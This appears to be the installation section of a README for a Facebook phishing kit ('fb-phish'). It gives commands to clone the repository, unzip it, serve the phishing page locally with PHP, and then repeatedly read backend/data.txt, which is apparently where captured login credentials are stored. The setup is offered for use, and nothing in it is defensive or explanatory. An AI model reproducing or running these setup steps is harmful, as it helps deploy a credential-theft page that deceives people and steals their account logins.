## Installation in linux enviroment

To install this project

```bash
  git clone https://github.com/paradoxmain/fb-phish.git
  cd fb-phish
  unzip FB-Phish.zip 
  cd FB-Phish
  php -S localhost:8080
```

Then open another session

```bash
    watch -n 5 'cat backend/data.txt'
```
